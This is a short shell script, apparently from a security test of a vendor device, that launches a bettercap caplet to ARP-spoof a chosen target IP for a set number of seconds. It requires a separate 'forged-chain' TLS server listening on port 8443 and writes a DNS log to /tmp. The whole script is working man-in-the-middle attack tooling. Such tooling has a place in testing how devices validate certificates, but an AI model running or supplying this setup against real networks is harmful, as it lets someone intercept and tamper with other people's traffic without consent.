#!/bin/sh
# Run the vendor MITM caplet for a bounded window and keep the DNS log.
#   ./vendor-mitm.sh [seconds] [target-ip]
# Requires root (ARP + raw sockets). Refuses to run if 8443 is not ours.
set -e
SECS=${1:-300}
TARGET=${2:-192.168.4.23}
LOG=/tmp/fss-vendor-mitm.log
CAP=$(dirname "$0")/vendor-mitm.cap

[ "$(id -u)" -eq 0 ] || { echo "run as root" >&2; exit 1; }
lsof -nP -iTCP:8443 -sTCP:LISTEN | grep -q Python || {
  echo "8443 is not the forged-chain server; start serve_forged.py first" >&2; exit 1; }

sed "s/^set arp.spoof.targets .*/set arp.spoof.targets $TARGET/" "$CAP" > /tmp/fss-vendor-mitm.cap
echo "spoofing $TARGET for ${SECS}s; dns log -> $LOG"
exec timeout "$SECS" bettercap -iface en1 -caplet /tmp/fss-vendor-mitm.cap 2>&1 | tee "$LOG"
